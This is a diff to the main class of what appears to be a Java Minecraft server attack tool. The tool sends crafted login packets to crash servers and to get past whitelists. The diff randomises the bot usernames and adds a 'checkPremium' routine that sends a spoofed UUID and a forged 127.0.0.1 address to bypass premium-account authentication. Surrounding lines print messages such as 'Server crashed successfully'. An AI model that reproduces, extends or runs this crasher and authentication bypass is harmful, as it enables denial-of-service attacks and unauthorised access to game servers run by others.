@@ -3,10 +3,7 @@ package studio.thamessia;
 import org.json.simple.JSONObject;
 import org.json.simple.parser.JSONParser;
 import org.json.simple.parser.ParseException;
-import studio.thamessia.Bypass.ChatMode;
-import studio.thamessia.Bypass.ClientSettingsBypass;
-import studio.thamessia.Bypass.MainHand;
-import studio.thamessia.Bypass.PlayerRotationBypass;
+import studio.thamessia.Bypass.*;
 import studio.thamessia.Crashers.ClickWindowPacket;
 import studio.thamessia.Crashers.Mode;
 import studio.thamessia.Packets.Handshake.HandshakePacket;
@@ -132,8 +129,10 @@ public class Main {
 
                                 Thread.sleep(250);
 
-                                LoginStart loginStart = new LoginStart("404." + new Random().nextInt(5000) + "");
+                                LoginStart loginStart = new LoginStart("404_" + new Random().nextInt(5000) + "");
                                 loginStart.sendPacket(dataOutputStream);
+
+                                //checkPremium(dataInputStream, dataOutputStream, (int) protocol, IP, port);
 
                                 //ClientSettingsBypass clientSettingsBypass = new ClientSettingsBypass("it_IT", (byte) 1, ChatMode.HIDDEN, false, (byte) 0x08, MainHand.RIGHT, true, false);
                                 //clientSettingsBypass.sendPacket(dataOutputStream);
@@ -237,8 +236,10 @@ public class Main {
 
                             Thread.sleep(250);
 
-                            LoginStart loginStart = new LoginStart("404." + new Random().nextInt(5000) + "");
+                            LoginStart loginStart = new LoginStart("404_" + new Random().nextInt(5000) + "");
                             loginStart.sendPacket(dataOutputStream);
+
+                            //checkPremium(dataInputStream, dataOutputStream, (int) protocol, IP, port);
 
                             //ClientSettingsBypass clientSettingsBypass = new ClientSettingsBypass("it_IT", (byte) 1, ChatMode.HIDDEN, false, (byte) 0x08, MainHand.RIGHT, true, false);
                             //clientSettingsBypass.sendPacket(dataOutputStream);
@@ -264,8 +265,8 @@ public class Main {
                             } catch (EOFException e) {
                                 System.err.println("[DivineError] Server crashed successfully.");
                             } catch (SocketException e) {
-			    	System.err.println("[DivineError] Trying to bypass whitelist...");
-			    }
+			    	            System.err.println("[DivineError] Trying to bypass whitelist...");
+			                }
 			   
                         /*new Thread(() -> {
                             try {
@@ -488,6 +489,18 @@ public class Main {
             }
         }
     }
+
+    private static void checkPremium(DataInputStream dataInputStream, DataOutputStream dataOutputStream, int protocol, String IP, int port) throws IOException {
+        String spoofedUUID = "1ea2dfd1-40bf-45c4-8c67-392e806f387d";
+        PremiumBypasser premiumBypasser = new PremiumBypasser(protocol,
+                IP, (short) port, NextState.LOGIN, "127.0.0.1", spoofedUUID);
+        int id = DataTypes.readVarInt(dataInputStream);
+
+        if (id == 0x03) return;
+        else premiumBypasser.sendPacket(dataOutputStream);
+
+    }
+
     //protected void finalize() throws IOException, ParseException, InterruptedException {
     //System.err.println("Emergency mode activated!");
     //System.out.println("Booting program...");
